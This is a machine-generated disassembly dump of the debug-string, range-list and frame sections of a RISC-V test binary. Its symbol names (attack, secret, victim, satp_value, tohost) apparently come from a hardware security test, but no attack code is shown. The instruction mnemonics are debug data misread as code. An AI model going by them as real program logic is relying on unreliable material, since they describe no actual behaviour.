 1ea:	7270                	.2byte	0x7270
 1ec:	6e69                	.2byte	0x6e69
 1ee:	6674                	.2byte	0x6674
 1f0:	705f 7475 6863      	.byte	0x5f, 0x70, 0x75, 0x74, 0x63, 0x68
 1f6:	6c00                	.2byte	0x6c00
 1f8:	20676e6f          	jal	t3,763fe <threadsense.2+0x7637a>
 1fc:	6f6c                	.2byte	0x6f6c
 1fe:	676e                	.2byte	0x676e
 200:	6920                	.2byte	0x6920
 202:	746e                	.2byte	0x746e
 204:	6200                	.2byte	0x6200
 206:	7469                	.2byte	0x7469
 208:	656d0073          	.4byte	0x656d0073
 20c:	736d                	.2byte	0x736d
 20e:	7465                	.2byte	0x7465
 210:	6700                	.2byte	0x6700
 212:	7465                	.2byte	0x7465
 214:	6975                	.2byte	0x6975
 216:	746e                	.2byte	0x746e
 218:	5f00                	.2byte	0x5f00
 21a:	675f 756e 5f63      	.byte	0x5f, 0x67, 0x6e, 0x75, 0x63, 0x5f
 220:	6176                	.2byte	0x6176
 222:	6c5f 7369 0074      	.byte	0x5f, 0x6c, 0x69, 0x73, 0x74, 0x00
 228:	64726f77          	.4byte	0x64726f77
 22c:	7000                	.2byte	0x7000
 22e:	7475                	.2byte	0x7475
 230:	6164                	.2byte	0x6164
 232:	0074                	.2byte	0x74
 234:	7962                	.2byte	0x7962
 236:	6574                	.2byte	0x6574
 238:	6e00                	.2byte	0x6e00
 23a:	6d61                	.2byte	0x6d61
 23c:	0065                	.2byte	0x65
 23e:	73756163          	bltu	a0,s7,960 <threadsense.2+0x8dc>
 242:	0065                	.2byte	0x65
 244:	69727073          	csrc	0x697,4
 248:	746e                	.2byte	0x746e
 24a:	0066                	.2byte	0x66
 24c:	7461                	.2byte	0x7461
 24e:	76006c6f          	jal	s8,69ae <threadsense.2+0x692a>
 252:	7265                	.2byte	0x7265
 254:	6669                	.2byte	0x6669
 256:	4479                	.2byte	0x4479
 258:	6c62756f          	jal	a0,2791e <threadsense.2+0x2789a>
 25c:	0065                	.2byte	0x65
 25e:	6261                	.2byte	0x6261
 260:	0074726f          	jal	tp,47a66 <threadsense.2+0x479e2>
 264:	6572                	.2byte	0x6572
 266:	74697773          	csrrc	a4,0x746,18
 26a:	6c006863          	bltu	zero,zero,93a <threadsense.2+0x8b6>
 26e:	20676e6f          	jal	t3,76474 <threadsense.2+0x763f0>
 272:	6f6c                	.2byte	0x6f6c
 274:	676e                	.2byte	0x676e
 276:	7520                	.2byte	0x7520
 278:	736e                	.2byte	0x736e
 27a:	6769                	.2byte	0x6769
 27c:	656e                	.2byte	0x656e
 27e:	2064                	.2byte	0x2064
 280:	6e69                	.2byte	0x6e69
 282:	0074                	.2byte	0x74
 284:	6574                	.2byte	0x6574
 286:	63007473          	csrrc	s0,0x630,0
 28a:	0065646f          	jal	s0,56290 <threadsense.2+0x5620c>
 28e:	63737973          	csrrc	s2,0x637,6
 292:	6c61                	.2byte	0x6c61
 294:	006c                	.2byte	0x6c
 296:	6f74                	.2byte	0x6f74
 298:	6f68                	.2byte	0x6f68
 29a:	655f7473          	csrrc	s0,hviph,30
 29e:	6978                	.2byte	0x6978
 2a0:	0074                	.2byte	0x74
 2a2:	616d                	.2byte	0x616d
 2a4:	5f636967          	.4byte	0x5f636967
 2a8:	656d                	.2byte	0x656d
 2aa:	006d                	.2byte	0x6d
 2ac:	6c727473          	csrrc	s0,0x6c7,4
 2b0:	6e65                	.2byte	0x6e65
 2b2:	7300                	.2byte	0x7300
 2b4:	7274                	.2byte	0x7274
 2b6:	00797063          	bgeu	s2,t2,2b6 <threadsense.2+0x232>
 2ba:	616c                	.2byte	0x616c
 2bc:	665f7473          	csrrc	s0,0x665,30
 2c0:	746d                	.2byte	0x746d
 2c2:	5f00                	.2byte	0x5f00
 2c4:	755f 6e69 3674      	.byte	0x5f, 0x75, 0x69, 0x6e, 0x74, 0x36
 2ca:	5f34                	.2byte	0x5f34
 2cc:	0074                	.2byte	0x74
 2ce:	6164                	.2byte	0x6164
 2d0:	6174                	.2byte	0x6174
 2d2:	6c00                	.2byte	0x6c00
 2d4:	7366                	.2byte	0x7366
 2d6:	3172                	.2byte	0x3172
 2d8:	0030                	.2byte	0x30
 2da:	5f5f 7562 6c69      	.byte	0x5f, 0x5f, 0x62, 0x75, 0x69, 0x6c
 2e0:	6974                	.2byte	0x6974
 2e2:	5f6e                	.2byte	0x5f6e
 2e4:	6176                	.2byte	0x6176
 2e6:	6c5f 7369 0074      	.byte	0x5f, 0x6c, 0x69, 0x73, 0x74, 0x00
 2ec:	6e676973          	csrrs	s2,0x6e6,14
 2f0:	6700                	.2byte	0x6700
 2f2:	7465                	.2byte	0x7465
 2f4:	6e69                	.2byte	0x6e69
 2f6:	0074                	.2byte	0x74
 2f8:	636e                	.2byte	0x636e
 2fa:	7365726f          	jal	tp,57a30 <threadsense.2+0x579ac>
 2fe:	6400                	.2byte	0x6400
 300:	7365                	.2byte	0x7365
 302:	0074                	.2byte	0x74
 304:	7370                	.2byte	0x7370
 306:	7274                	.2byte	0x7274
 308:	6300                	.2byte	0x6300
 30a:	746e756f          	jal	a0,e7a50 <threadsense.2+0xe79cc>
 30e:	6600                	.2byte	0x6600
 310:	6f72                	.2byte	0x6f72
 312:	686d                	.2byte	0x686d
 314:	0074736f          	jal	t1,47b1a <threadsense.2+0x47a96>
 318:	6c61                	.2byte	0x6c61
 31a:	6674                	.2byte	0x6674
 31c:	616c                	.2byte	0x616c
 31e:	74730067          	jr	1863(t1)
 322:	6372                	.2byte	0x6372
 324:	706d                	.2byte	0x706d
 326:	7400                	.2byte	0x7400
 328:	7268                	.2byte	0x7268
 32a:	6165                	.2byte	0x6165
 32c:	7364                	.2byte	0x7364
 32e:	6e65                	.2byte	0x6e65
 330:	70006573          	csrrs	a0,0x700,0
 334:	6972                	.2byte	0x6972
 336:	746e                	.2byte	0x746e
 338:	756e                	.2byte	0x756e
 33a:	006d                	.2byte	0x6d
 33c:	7261                	.2byte	0x7261
 33e:	61003067          	.4byte	0x61003067
 342:	6772                	.2byte	0x6772
 344:	0031                	.2byte	0x31
 346:	6f64                	.2byte	0x6f64
 348:	6275                	.2byte	0x6275
 34a:	656c                	.2byte	0x656c
 34c:	7400                	.2byte	0x7400
 34e:	736f686f          	jal	a6,f6a84 <threadsense.2+0xf6a00>
 352:	0074                	.2byte	0x74
 354:	666c                	.2byte	0x666c
 356:	77007273          	csrrc	tp,0x770,0
 35a:	6968                	.2byte	0x6968
 35c:	62006863          	bltu	zero,zero,98c <threadsense.2+0x908>
 360:	7361                	.2byte	0x7361
 362:	0065                	.2byte	0x65
 364:	7270                	.2byte	0x7270
 366:	6e69                	.2byte	0x6e69
 368:	6874                	.2byte	0x6874
 36a:	7865                	.2byte	0x7865
 36c:	7200                	.2byte	0x7200
 36e:	6765                	.2byte	0x6765
 370:	6d760073          	.4byte	0x6d760073
 374:	625f 6f6f 0074      	.byte	0x5f, 0x62, 0x6f, 0x6f, 0x74, 0x00
 37a:	5f5f 6975 746e      	.byte	0x5f, 0x5f, 0x75, 0x69, 0x6e, 0x74
 380:	5f38                	.2byte	0x5f38
 382:	0074                	.2byte	0x74
 384:	70746173          	csrrs	sp,0x707,8
 388:	765f 6c61 6575      	.byte	0x5f, 0x76, 0x61, 0x6c, 0x75, 0x65
 38e:	6100                	.2byte	0x6100
 390:	7474                	.2byte	0x7474
 392:	6361                	.2byte	0x6361
 394:	6573006b          	.4byte	0x6573006b
 398:	74657263          	bgeu	a0,t1,adc <threadsense.2+0xa58>
 39c:	7000                	.2byte	0x7000
 39e:	6574                	.2byte	0x6574
 3a0:	745f 6c00 7366      	.byte	0x5f, 0x74, 0x00, 0x6c, 0x66, 0x73
 3a6:	3672                	.2byte	0x3672
 3a8:	6d760033          	.4byte	0x6d760033
 3ac:	635f 6f68 6369      	.byte	0x5f, 0x63, 0x68, 0x6f, 0x69, 0x63
 3b2:	0065                	.2byte	0x65
 3b4:	6f74                	.2byte	0x6f74
 3b6:	6562                	.2byte	0x6562
 3b8:	0031                	.2byte	0x31
 3ba:	6e69                	.2byte	0x6e69
 3bc:	6966                	.2byte	0x6966
 3be:	696e                	.2byte	0x696e
 3c0:	6574                	.2byte	0x6574
 3c2:	7300                	.2byte	0x7300
 3c4:	6f74                	.2byte	0x6f74
 3c6:	7370                	.2byte	0x7370
 3c8:	6769                	.2byte	0x6769
 3ca:	615f 6464 0072      	.byte	0x5f, 0x61, 0x64, 0x64, 0x72, 0x00
 3d0:	6f76                	.2byte	0x6f76
 3d2:	6574                	.2byte	0x6574
 3d4:	656e0073          	.4byte	0x656e0073
 3d8:	64657473          	csrrc	s0,hviprio1,10
 3dc:	7200                	.2byte	0x7200
 3de:	6765                	.2byte	0x6765
 3e0:	7564                	.2byte	0x7564
 3e2:	706d                	.2byte	0x706d
 3e4:	615f 6464 0072      	.byte	0x5f, 0x61, 0x64, 0x64, 0x72, 0x00
 3ea:	6562                	.2byte	0x6562
 3ec:	696e                	.2byte	0x696e
 3ee:	6d006e67          	.4byte	0x6d006e67
 3f2:	7375                	.2byte	0x7375
 3f4:	6274                	.2byte	0x6274
 3f6:	3065                	.2byte	0x3065
 3f8:	6300                	.2byte	0x6300
 3fa:	6379                	.2byte	0x6379
 3fc:	656c                	.2byte	0x656c
 3fe:	69760073          	.4byte	0x69760073
 402:	6d697463          	bgeu	s2,s6,aca <threadsense.2+0xa46>
 406:	6300                	.2byte	0x6300
 408:	6379                	.2byte	0x6379
 40a:	656c                	.2byte	0x656c
 40c:	7300                	.2byte	0x7300
 40e:	6174                	.2byte	0x6174
 410:	7472                	.2byte	0x7472
 412:	6d00                	.2byte	0x6d00
 414:	6961                	.2byte	0x6961
 416:	006e                	.2byte	0x6e

Disassembly of section .debug_rnglists:

0000000000000000 <.debug_rnglists>:
   0:	001e                	.2byte	0x1e
   2:	0000                	.2byte	0x0
   4:	0005                	.2byte	0x5
   6:	0008                	.2byte	0x8
   8:	0000                	.2byte	0x0
   a:	0000                	.2byte	0x0
   c:	00000007          	.4byte	0x7
  10:	0080                	.2byte	0x80
  12:	0000                	.2byte	0x0
  14:	c800                	.2byte	0xc800
  16:	00000703          	lb	a4,0(zero) # 0 <threadsense.5>
  1a:	8020                	.2byte	0x8020
  1c:	0000                	.2byte	0x0
  1e:	0000                	.2byte	0x0
  20:	0014                	.2byte	0x14
  22:	005e                	.2byte	0x5e
  24:	0000                	.2byte	0x0
  26:	0005                	.2byte	0x5
  28:	0008                	.2byte	0x8
  2a:	0000                	.2byte	0x0
  2c:	0000                	.2byte	0x0
  2e:	8c06                	.2byte	0x8c06
  30:	0026                	.2byte	0x26
  32:	0080                	.2byte	0x80
  34:	0000                	.2byte	0x0
  36:	2400                	.2byte	0x2400
  38:	0080002b          	.4byte	0x80002b
  3c:	0000                	.2byte	0x0
  3e:	0600                	.2byte	0x600
  40:	0010                	.2byte	0x10
  42:	8020                	.2byte	0x8020
  44:	0000                	.2byte	0x0
  46:	0000                	.2byte	0x0
  48:	00d4                	.2byte	0xd4
  4a:	8020                	.2byte	0x8020
  4c:	0000                	.2byte	0x0
  4e:	0000                	.2byte	0x0
  50:	d406                	.2byte	0xd406
  52:	2000                	.2byte	0x2000
  54:	0080                	.2byte	0x80
  56:	0000                	.2byte	0x0
  58:	fc00                	.2byte	0xfc00
  5a:	2000                	.2byte	0x2000
  5c:	0080                	.2byte	0x80
  5e:	0000                	.2byte	0x0
  60:	0600                	.2byte	0x600
  62:	00fc                	.2byte	0xfc
  64:	8020                	.2byte	0x8020
  66:	0000                	.2byte	0x0
  68:	0000                	.2byte	0x0
  6a:	016c                	.2byte	0x16c
  6c:	8020                	.2byte	0x8020
  6e:	0000                	.2byte	0x0
  70:	0000                	.2byte	0x0
  72:	6c06                	.2byte	0x6c06
  74:	2001                	.2byte	0x2001
  76:	0080                	.2byte	0x80
  78:	0000                	.2byte	0x0
  7a:	2800                	.2byte	0x2800
  7c:	2004                	.2byte	0x2004
  7e:	0080                	.2byte	0x80
  80:	0000                	.2byte	0x0
	...

Disassembly of section .debug_frame:

0000000000000000 <.debug_frame>:
   0:	000c                	.2byte	0xc
   2:	0000                	.2byte	0x0
   4:	ffff                	.2byte	0xffff
   6:	ffff                	.2byte	0xffff
   8:	7c010003          	lb	zero,1984(sp)
   c:	0d01                	.2byte	0xd01
   e:	0002                	.2byte	0x2
  10:	002c                	.2byte	0x2c
  12:	0000                	.2byte	0x0
  14:	0000                	.2byte	0x0
  16:	0000                	.2byte	0x0
  18:	1048                	.2byte	0x1048
  1a:	8000                	.2byte	0x8000
  1c:	0000                	.2byte	0x0
  1e:	0000                	.2byte	0x0
  20:	0058                	.2byte	0x58
  22:	0000                	.2byte	0x0
  24:	0000                	.2byte	0x0
  26:	0000                	.2byte	0x0
  28:	0e44                	.2byte	0xe44
  2a:	4420                	.2byte	0x4420
  2c:	0288                	.2byte	0x288
  2e:	0c44                	.2byte	0xc44
  30:	0008                	.2byte	0x8
  32:	4402                	.2byte	0x4402
  34:	0cc8                	.2byte	0xcc8
  36:	2002                	.2byte	0x2002
  38:	0e44                	.2byte	0xe44
  3a:	0000                	.2byte	0x0
  3c:	0000                	.2byte	0x0
  3e:	0000                	.2byte	0x0
  40:	000c                	.2byte	0xc
  42:	0000                	.2byte	0x0
  44:	ffff                	.2byte	0xffff
  46:	ffff                	.2byte	0xffff
  48:	7c010003          	lb	zero,1984(sp)
  4c:	0d01                	.2byte	0xd01
  4e:	0002                	.2byte	0x2
  50:	002c                	.2byte	0x2c
  52:	0000                	.2byte	0x0
  54:	0040                	.2byte	0x40
  56:	0000                	.2byte	0x0
  58:	10a0                	.2byte	0x10a0
  5a:	8000                	.2byte	0x8000
  5c:	0000                	.2byte	0x0
  5e:	0000                	.2byte	0x0
  60:	002c                	.2byte	0x2c
  62:	0000                	.2byte	0x0
  64:	0000                	.2byte	0x0
  66:	0000                	.2byte	0x0
  68:	0e44                	.2byte	0xe44
  6a:	4430                	.2byte	0x4430
  6c:	0288                	.2byte	0x288
  6e:	0c44                	.2byte	0xc44
  70:	0008                	.2byte	0x8
  72:	c858                	.2byte	0xc858
  74:	020c                	.2byte	0x20c
  76:	4430                	.2byte	0x4430
  78:	000e                	.2byte	0xe
  7a:	0000                	.2byte	0x0
  7c:	0000                	.2byte	0x0
  7e:	0000                	.2byte	0x0
  80:	002c                	.2byte	0x2c
  82:	0000                	.2byte	0x0
  84:	0040                	.2byte	0x40
  86:	0000                	.2byte	0x0
  88:	10cc                	.2byte	0x10cc
  8a:	8000                	.2byte	0x8000
  8c:	0000                	.2byte	0x0
  8e:	0000                	.2byte	0x0
  90:	002c                	.2byte	0x2c
  92:	0000                	.2byte	0x0
  94:	0000                	.2byte	0x0
  96:	0000                	.2byte	0x0
  98:	0e44                	.2byte	0xe44
  9a:	4430                	.2byte	0x4430
  9c:	0288                	.2byte	0x288
  9e:	0c44                	.2byte	0xc44
  a0:	0008                	.2byte	0x8
  a2:	c858                	.2byte	0xc858
  a4:	020c                	.2byte	0x20c
  a6:	4430                	.2byte	0x4430
  a8:	000e                	.2byte	0xe
  aa:	0000                	.2byte	0x0
  ac:	0000                	.2byte	0x0
  ae:	0000                	.2byte	0x0
  b0:	002c                	.2byte	0x2c
  b2:	0000                	.2byte	0x0
  b4:	0040                	.2byte	0x40
  b6:	0000                	.2byte	0x0
  b8:	10f8                	.2byte	0x10f8
  ba:	8000                	.2byte	0x8000
  bc:	0000                	.2byte	0x0
  be:	0000                	.2byte	0x0
  c0:	0178                	.2byte	0x178
  c2:	0000                	.2byte	0x0
  c4:	0000                	.2byte	0x0
  c6:	0000                	.2byte	0x0
  c8:	0e44                	.2byte	0xe44
  ca:	4450                	.2byte	0x4450
  cc:	0288                	.2byte	0x288
  ce:	0c44                	.2byte	0xc44
  d0:	0008                	.2byte	0x8
  d2:	c8016403          	lwu	s0,-896(sp)
  d6:	020c                	.2byte	0x20c
  d8:	4450                	.2byte	0x4450
  da:	000e                	.2byte	0xe
  dc:	0000                	.2byte	0x0
  de:	0000                	.2byte	0x0
  e0:	002c                	.2byte	0x2c
  e2:	0000                	.2byte	0x0
  e4:	0040                	.2byte	0x40
  e6:	0000                	.2byte	0x0
  e8:	1270                	.2byte	0x1270
  ea:	8000                	.2byte	0x8000
  ec:	0000                	.2byte	0x0
  ee:	0000                	.2byte	0x0
  f0:	0188                	.2byte	0x188
  f2:	0000                	.2byte	0x0
  f4:	0000                	.2byte	0x0
  f6:	0000                	.2byte	0x0
  f8:	0e44                	.2byte	0xe44
  fa:	4460                	.2byte	0x4460
  fc:	0288                	.2byte	0x288
  fe:	0c44                	.2byte	0xc44
 100:	0008                	.2byte	0x8
 102:	c8017403          	.4byte	0xc8017403
 106:	020c                	.2byte	0x20c
 108:	4460                	.2byte	0x4460
 10a:	000e                	.2byte	0xe
 10c:	0000                	.2byte	0x0
 10e:	0000                	.2byte	0x0
 110:	002c                	.2byte	0x2c
 112:	0000                	.2byte	0x0
 114:	0040                	.2byte	0x40
 116:	0000                	.2byte	0x0
 118:	13f8                	.2byte	0x13f8
 11a:	8000                	.2byte	0x8000
 11c:	0000                	.2byte	0x0
 11e:	0000                	.2byte	0x0
 120:	00a8                	.2byte	0xa8
 122:	0000                	.2byte	0x0
 124:	0000                	.2byte	0x0
 126:	0000                	.2byte	0x0
 128:	0e44                	.2byte	0xe44
 12a:	4420                	.2byte	0x4420
 12c:	0288                	.2byte	0x288
 12e:	0c44                	.2byte	0xc44
 130:	0008                	.2byte	0x8
 132:	9402                	.2byte	0x9402
 134:	0cc8                	.2byte	0xcc8
 136:	2002                	.2byte	0x2002
 138:	0e44                	.2byte	0xe44
 13a:	0000                	.2byte	0x0
 13c:	0000                	.2byte	0x0
 13e:	0000                	.2byte	0x0
 140:	002c                	.2byte	0x2c
 142:	0000                	.2byte	0x0
 144:	0040                	.2byte	0x40
 146:	0000                	.2byte	0x0
 148:	14a0                	.2byte	0x14a0
 14a:	8000                	.2byte	0x8000
 14c:	0000                	.2byte	0x0
 14e:	0000                	.2byte	0x0
 150:	004c                	.2byte	0x4c
 152:	0000                	.2byte	0x0
 154:	0000                	.2byte	0x0
 156:	0000                	.2byte	0x0
 158:	0e44                	.2byte	0xe44
 15a:	4430                	.2byte	0x4430
 15c:	0288                	.2byte	0x288
 15e:	0c44                	.2byte	0xc44
 160:	0008                	.2byte	0x8
 162:	c878                	.2byte	0xc878
 164:	020c                	.2byte	0x20c
 166:	4430                	.2byte	0x4430
 168:	000e                	.2byte	0xe
 16a:	0000                	.2byte	0x0
 16c:	0000                	.2byte	0x0
 16e:	0000                	.2byte	0x0
 170:	002c                	.2byte	0x2c
 172:	0000                	.2byte	0x0
 174:	0040                	.2byte	0x40
 176:	0000                	.2byte	0x0
 178:	14ec                	.2byte	0x14ec
 17a:	8000                	.2byte	0x8000
 17c:	0000                	.2byte	0x0
 17e:	0000                	.2byte	0x0
 180:	004c                	.2byte	0x4c
 182:	0000                	.2byte	0x0
 184:	0000                	.2byte	0x0
 186:	0000                	.2byte	0x0
 188:	0e44                	.2byte	0xe44
 18a:	4430                	.2byte	0x4430
 18c:	0288                	.2byte	0x288
 18e:	0c44                	.2byte	0xc44
 190:	0008                	.2byte	0x8
 192:	c878                	.2byte	0xc878
 194:	020c                	.2byte	0x20c
 196:	4430                	.2byte	0x4430
 198:	000e                	.2byte	0xe
 19a:	0000                	.2byte	0x0
 19c:	0000                	.2byte	0x0
 19e:	0000                	.2byte	0x0
 1a0:	002c                	.2byte	0x2c
 1a2:	0000                	.2byte	0x0
 1a4:	0040                	.2byte	0x40
 1a6:	0000                	.2byte	0x0
 1a8:	1538                	.2byte	0x1538
 1aa:	8000                	.2byte	0x8000
 1ac:	0000                	.2byte	0x0
 1ae:	0000                	.2byte	0x0
 1b0:	00a4                	.2byte	0xa4
 1b2:	0000                	.2byte	0x0
 1b4:	0000                	.2byte	0x0
 1b6:	0000                	.2byte	0x0
 1b8:	0e44                	.2byte	0xe44
 1ba:	01b0                	.2byte	0x1b0
 1bc:	8844                	.2byte	0x8844
 1be:	4402                	.2byte	0x4402
 1c0:	080c                	.2byte	0x80c
 1c2:	0200                	.2byte	0x200
 1c4:	c890                	.2byte	0xc890
 1c6:	020c                	.2byte	0x20c
 1c8:	01b0                	.2byte	0x1b0
 1ca:	0e44                	.2byte	0xe44
 1cc:	0000                	.2byte	0x0
 1ce:	0000                	.2byte	0x0
 1d0:	0024                	.2byte	0x24
 1d2:	0000                	.2byte	0x0
 1d4:	0040                	.2byte	0x40
 1d6:	0000                	.2byte	0x0
 1d8:	15dc                	.2byte	0x15dc
 1da:	8000                	.2byte	0x8000
 1dc:	0000                	.2byte	0x0
 1de:	0000                	.2byte	0x0
 1e0:	0030                	.2byte	0x30
 1e2:	0000                	.2byte	0x0
 1e4:	0000                	.2byte	0x0
 1e6:	0000                	.2byte	0x0
 1e8:	0e44                	.2byte	0xe44
 1ea:	4420                	.2byte	0x4420
 1ec:	0288                	.2byte	0x288
 1ee:	0c44                	.2byte	0xc44
 1f0:	0008                	.2byte	0x8
 1f2:	0000                	.2byte	0x0
 1f4:	0000                	.2byte	0x0
 1f6:	0000                	.2byte	0x0
 1f8:	0024                	.2byte	0x24
 1fa:	0000                	.2byte	0x0
 1fc:	0040                	.2byte	0x40
 1fe:	0000                	.2byte	0x0
 200:	160c                	.2byte	0x160c
 202:	8000                	.2byte	0x8000
 204:	0000                	.2byte	0x0
 206:	0000                	.2byte	0x0
 208:	0024                	.2byte	0x24
 20a:	0000                	.2byte	0x0
 20c:	0000                	.2byte	0x0
 20e:	0000                	.2byte	0x0
 210:	0e44                	.2byte	0xe44
 212:	4830                	.2byte	0x4830
 214:	0281                	.2byte	0x281
 216:	0488                	.2byte	0x488
 218:	0c44                	.2byte	0xc44
 21a:	0008                	.2byte	0x8
 21c:	0000                	.2byte	0x0
 21e:	0000                	.2byte	0x0
 220:	0024                	.2byte	0x24
 222:	0000                	.2byte	0x0
 224:	0040                	.2byte	0x40
 226:	0000                	.2byte	0x0
 228:	1630                	.2byte	0x1630
 22a:	8000                	.2byte	0x8000
 22c:	0000                	.2byte	0x0
 22e:	0000                	.2byte	0x0
 230:	0024                	.2byte	0x24
 232:	0000                	.2byte	0x0
 234:	0000                	.2byte	0x0
 236:	0000                	.2byte	0x0
 238:	0e44                	.2byte	0xe44
 23a:	4820                	.2byte	0x4820
 23c:	0281                	.2byte	0x281
 23e:	0488                	.2byte	0x488
 240:	0c44                	.2byte	0xc44
 242:	0008                	.2byte	0x8
 244:	0000                	.2byte	0x0
 246:	0000                	.2byte	0x0
 248:	0024                	.2byte	0x24
 24a:	0000                	.2byte	0x0
 24c:	0040                	.2byte	0x40
 24e:	0000                	.2byte	0x0
 250:	1654                	.2byte	0x1654
 252:	8000                	.2byte	0x8000
 254:	0000                	.2byte	0x0
 256:	0000                	.2byte	0x0
 258:	0018                	.2byte	0x18
 25a:	0000                	.2byte	0x0
 25c:	0000                	.2byte	0x0
 25e:	0000                	.2byte	0x0
 260:	0e44                	.2byte	0xe44
 262:	4810                	.2byte	0x4810
 264:	0281                	.2byte	0x281
 266:	0488                	.2byte	0x488
 268:	0c44                	.2byte	0xc44
 26a:	0008                	.2byte	0x8
 26c:	0000                	.2byte	0x0
 26e:	0000                	.2byte	0x0
 270:	0034                	.2byte	0x34
 272:	0000                	.2byte	0x0
 274:	0040                	.2byte	0x40
 276:	0000                	.2byte	0x0
 278:	166c                	.2byte	0x166c
 27a:	8000                	.2byte	0x8000
 27c:	0000                	.2byte	0x0
 27e:	0000                	.2byte	0x0
 280:	0054                	.2byte	0x54
 282:	0000                	.2byte	0x0
 284:	0000                	.2byte	0x0
 286:	0000                	.2byte	0x0
 288:	0e44                	.2byte	0xe44
 28a:	4c30                	.2byte	0x4c30
 28c:	0281                	.2byte	0x281
 28e:	0488                	.2byte	0x488
 290:	0689                	.2byte	0x689
 292:	0c44                	.2byte	0xc44
 294:	0008                	.2byte	0x8
 296:	c170                	.2byte	0xc170
 298:	c844                	.2byte	0xc844
 29a:	020c                	.2byte	0x20c
 29c:	4430                	.2byte	0x4430
 29e:	44c9                	.2byte	0x44c9
 2a0:	000e                	.2byte	0xe
 2a2:	0000                	.2byte	0x0
 2a4:	0000                	.2byte	0x0
 2a6:	0000                	.2byte	0x0
 2a8:	002c                	.2byte	0x2c
 2aa:	0000                	.2byte	0x0
 2ac:	0040                	.2byte	0x40
 2ae:	0000                	.2byte	0x0
 2b0:	16c0                	.2byte	0x16c0
 2b2:	8000                	.2byte	0x8000
 2b4:	0000                	.2byte	0x0
 2b6:	0000                	.2byte	0x0
 2b8:	0094                	.2byte	0x94
 2ba:	0000                	.2byte	0x0
 2bc:	0000                	.2byte	0x0
 2be:	0000                	.2byte	0x0
 2c0:	0e44                	.2byte	0xe44
 2c2:	4820                	.2byte	0x4820
 2c4:	0281                	.2byte	0x281
 2c6:	0488                	.2byte	0x488
 2c8:	0c44                	.2byte	0xc44
 2ca:	0008                	.2byte	0x8
 2cc:	7802                	.2byte	0x7802
 2ce:	44c1                	.2byte	0x44c1
 2d0:	0cc8                	.2byte	0xcc8
 2d2:	2002                	.2byte	0x2002
 2d4:	0e44                	.2byte	0xe44
 2d6:	0000                	.2byte	0x0
 2d8:	002c                	.2byte	0x2c
 2da:	0000                	.2byte	0x0
 2dc:	0040                	.2byte	0x40
 2de:	0000                	.2byte	0x0
 2e0:	1754                	.2byte	0x1754
 2e2:	8000                	.2byte	0x8000
 2e4:	0000                	.2byte	0x0
 2e6:	0000                	.2byte	0x0
 2e8:	00b8                	.2byte	0xb8
 2ea:	0000                	.2byte	0x0
 2ec:	0000                	.2byte	0x0
 2ee:	0000                	.2byte	0x0
 2f0:	0e44                	.2byte	0xe44
 2f2:	4840                	.2byte	0x4840
 2f4:	0281                	.2byte	0x281
 2f6:	0488                	.2byte	0x488
 2f8:	0c44                	.2byte	0xc44
 2fa:	0008                	.2byte	0x8
 2fc:	9c02                	.2byte	0x9c02
 2fe:	44c1                	.2byte	0x44c1
 300:	0cc8                	.2byte	0xcc8
 302:	4002                	.2byte	0x4002
 304:	0e44                	.2byte	0xe44
 306:	0000                	.2byte	0x0
 308:	0034                	.2byte	0x34
 30a:	0000                	.2byte	0x0
 30c:	0040                	.2byte	0x40
 30e:	0000                	.2byte	0x0
 310:	180c                	.2byte	0x180c
 312:	8000                	.2byte	0x8000
 314:	0000                	.2byte	0x0
 316:	0000                	.2byte	0x0
 318:	014c                	.2byte	0x14c
 31a:	0000                	.2byte	0x0
 31c:	0000                	.2byte	0x0
 31e:	0000                	.2byte	0x0
 320:	0e44                	.2byte	0xe44
 322:	02d0                	.2byte	0x2d0
 324:	8148                	.2byte	0x8148
 326:	8802                	.2byte	0x8802
 328:	4404                	.2byte	0x4404
 32a:	080c                	.2byte	0x80c
 32c:	0300                	.2byte	0x300
 32e:	0130                	.2byte	0x130
 330:	44c1                	.2byte	0x44c1
 332:	0cc8                	.2byte	0xcc8
 334:	d002                	.2byte	0xd002
 336:	4402                	.2byte	0x4402
 338:	000e                	.2byte	0xe
 33a:	0000                	.2byte	0x0
 33c:	0000                	.2byte	0x0
 33e:	0000                	.2byte	0x0
 340:	002c                	.2byte	0x2c
 342:	0000                	.2byte	0x0
 344:	0040                	.2byte	0x40
 346:	0000                	.2byte	0x0
 348:	1958                	.2byte	0x1958
 34a:	8000                	.2byte	0x8000
 34c:	0000                	.2byte	0x0
 34e:	0000                	.2byte	0x0
 350:	009c                	.2byte	0x9c
 352:	0000                	.2byte	0x0
 354:	0000                	.2byte	0x0
 356:	0000                	.2byte	0x0
 358:	0e44                	.2byte	0xe44
 35a:	4420                	.2byte	0x4420
 35c:	0288                	.2byte	0x288
 35e:	0c44                	.2byte	0xc44
 360:	0008                	.2byte	0x8
 362:	8802                	.2byte	0x8802
 364:	0cc8                	.2byte	0xcc8
 366:	2002                	.2byte	0x2002
 368:	0e44                	.2byte	0xe44
 36a:	0000                	.2byte	0x0
 36c:	0000                	.2byte	0x0
 36e:	0000                	.2byte	0x0
 370:	002c                	.2byte	0x2c
 372:	0000                	.2byte	0x0
 374:	0040                	.2byte	0x40
 376:	0000                	.2byte	0x0
 378:	19f4                	.2byte	0x19f4
 37a:	8000                	.2byte	0x8000
 37c:	0000                	.2byte	0x0
 37e:	0000                	.2byte	0x0
 380:	0094                	.2byte	0x94
 382:	0000                	.2byte	0x0
 384:	0000                	.2byte	0x0
 386:	0000                	.2byte	0x0
 388:	0e44                	.2byte	0xe44
 38a:	4420                	.2byte	0x4420
 38c:	0288                	.2byte	0x288
 38e:	0c44                	.2byte	0xc44
 390:	0008                	.2byte	0x8
 392:	8002                	.2byte	0x8002
 394:	0cc8                	.2byte	0xcc8
 396:	2002                	.2byte	0x2002
 398:	0e44                	.2byte	0xe44
 39a:	0000                	.2byte	0x0
 39c:	0000                	.2byte	0x0
 39e:	0000                	.2byte	0x0
 3a0:	0034                	.2byte	0x34
 3a2:	0000                	.2byte	0x0
 3a4:	0040                	.2byte	0x40
 3a6:	0000                	.2byte	0x0
 3a8:	1a88                	.2byte	0x1a88
 3aa:	8000                	.2byte	0x8000
 3ac:	0000                	.2byte	0x0
 3ae:	0000                	.2byte	0x0
 3b0:	0440                	.2byte	0x440
 3b2:	0000                	.2byte	0x0
 3b4:	0000                	.2byte	0x0
 3b6:	0000                	.2byte	0x0
 3b8:	0e44                	.2byte	0xe44
 3ba:	5070                	.2byte	0x5070
 3bc:	0281                	.2byte	0x281
 3be:	0488                	.2byte	0x488
 3c0:	0689                	.2byte	0x689
 3c2:	0892                	.2byte	0x892
 3c4:	0c44                	.2byte	0xc44
 3c6:	0008                	.2byte	0x8
 3c8:	c1041403          	lh	s0,-1008(s0)
